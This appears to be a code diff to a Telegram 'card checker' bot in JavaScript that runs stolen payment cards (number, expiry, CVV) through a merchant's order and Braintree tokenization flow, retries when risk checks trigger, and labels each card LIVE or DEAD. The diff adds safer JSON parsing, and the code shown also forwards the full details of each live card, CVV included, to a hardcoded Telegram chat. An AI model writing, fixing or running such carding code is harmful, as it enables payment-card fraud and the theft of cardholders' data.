@@ -81,6 +81,25 @@ function extractString(str, start, end) {
     return substring.substring(0, endIndex);
 }
 
+function safeJsonParse(data) {
+    // If already an object, return as-is
+    if (typeof data === 'object' && data !== null) {
+        return data;
+    }
+    
+    // If string, try to parse
+    if (typeof data === 'string') {
+        try {
+            return JSON.parse(data);
+        } catch (e) {
+            console.error('JSON parse error:', e.message);
+            return data;
+        }
+    }
+    
+    return data;
+}
+
 function parseCard(card, validYYYY = 4) {
     const parts = card.split('|');
     let [cc, mm, yyyy, cvv] = parts;
@@ -175,9 +194,27 @@ async function makeRequest(url, options = {}, sessionId, cookieId) {
             fs.writeFileSync(cookieFile, response.headers['set-cookie'].join('; '));
         }
         
+        // Return data as-is (axios already parses JSON)
+        // If it's a string and looks like JSON, parse it
+        if (typeof response.data === 'string' && (response.data.startsWith('{') || response.data.startsWith('['))) {
+            try {
+                return JSON.parse(response.data);
+            } catch (e) {
+                return response.data;
+            }
+        }
+        
         return response.data;
     } catch (error) {
         if (error.response) {
+            // Handle error response data
+            if (typeof error.response.data === 'string' && (error.response.data.startsWith('{') || error.response.data.startsWith('['))) {
+                try {
+                    return JSON.parse(error.response.data);
+                } catch (e) {
+                    return error.response.data;
+                }
+            }
             return error.response.data;
         }
         throw error;
@@ -305,7 +342,8 @@ async function processCard(chatId, cardText) {
                     cookie
                 );
 
-                const orderData = JSON.parse(order);
+                // Safely parse order response
+                const orderData = safeJsonParse(order);
                 if (!orderData?.Result?.order?.userSessionId) {
                     throw new Error('Failed to create order - invalid response');
                 }
@@ -323,7 +361,8 @@ async function processCard(chatId, cardText) {
                     cookie
                 );
 
-                const tokenData = JSON.parse(tokenResponse);
+                // Safely parse token response
+                const tokenData = safeJsonParse(tokenResponse);
                 if (!tokenData?.ClientToken) {
                     throw new Error('Failed to get payment token - invalid response');
                 }
@@ -384,7 +423,8 @@ async function processCard(chatId, cardText) {
                     cookie
                 );
 
-                const braintreeData = JSON.parse(braintreeResponse);
+                // Safely parse braintree response
+                const braintreeData = safeJsonParse(braintreeResponse);
                 if (!braintreeData?.data?.tokenizeCreditCard?.token) {
                     throw new Error('Failed to tokenize card - invalid response from Braintree');
                 }
@@ -411,7 +451,9 @@ async function processCard(chatId, cardText) {
                     cookie
                 );
 
-                const responseText = typeof checkoutResponse === 'string' ? checkoutResponse : JSON.stringify(checkoutResponse);
+                // Convert checkout response to searchable text
+                const responseObj = safeJsonParse(checkoutResponse);
+                const responseText = typeof checkoutResponse === 'string' ? checkoutResponse : JSON.stringify(responseObj);
 
                 // Check for retry conditions
                 if ((responseText.includes('risk_threshold') || 
@@ -436,13 +478,8 @@ async function processCard(chatId, cardText) {
                     await forwardersd(`Live Card ${cc}|${mm}|${yyyy}|${cvv} galing bot pare`, 6050175626);
                     
                     let errorMsg = 'Success';
-                    try {
-                        const parsedResponse = JSON.parse(responseText);
-                        errorMsg = parsedResponse.ErrorMessage || 'Success';
-                    } catch (parseError) {
-                        console.error('Failed to parse live response:', parseError);
-                        errorMsg = 'Payment Authorised';
-                    }
+                    const parsedResponse = safeJsonParse(responseObj);
+                    errorMsg = parsedResponse?.ErrorMessage || 'Payment Authorised';
                     result = {
                         status: 'live',
                         message: `✅ *LIVE*\n\n💳 \`${cardText}\`\n\n📝 *Response:*\nPayment Authorised [${errorMsg}]`
@@ -466,14 +503,14 @@ async function processCard(chatId, cardText) {
                         message: `❌ *DEAD*\n\n💳 \`${cardText}\`\n\n📝 *Response:*\n${errorMsg}`
                     };
                 } else {
-                    let errorMsg = 'Declined';
-                    try {
-                        const parsedResponse = JSON.parse(responseText);
-                        errorMsg = parsedResponse.ErrorMessage || 'Declined';
-                    } catch (parseError) {
-                        console.error('Failed to parse response:', parseError);
+                    const parsedResponse = safeJsonParse(responseObj);
+                    let errorMsg = parsedResponse?.ErrorMessage || 'Declined';
+                    
+                    // If no error message found, use part of the response
+                    if (errorMsg === 'Declined' && responseText) {
                         errorMsg = responseText.substring(0, 100) || 'Declined';
                     }
+                    
                     result = {
                         status: 'dead',
                         message: `❌ *DEAD*\n\n💳 \`${cardText}\`\n\n📝 *Response:*\n${errorMsg}`
